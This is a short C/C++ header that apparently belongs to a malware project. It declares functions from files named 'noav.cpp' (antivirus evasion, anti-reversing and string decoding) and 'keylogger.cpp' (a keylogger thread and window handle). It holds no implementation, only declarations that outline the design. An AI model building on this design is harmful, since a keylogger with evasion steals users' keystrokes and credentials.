#pragma once

#ifdef DEBUGME
extern FILE * debug_log_stream;
#endif

// From noav.cpp
extern char decode_buffer[1024];
extern BOOL noav(BOOL InThread);
extern void noreverse(void);
extern char *decode(char *texte);

// From keylogger.cpp
DWORD WINAPI WinAPIextentionK(LPVOID param);
extern HWND keylogger_handle_window;
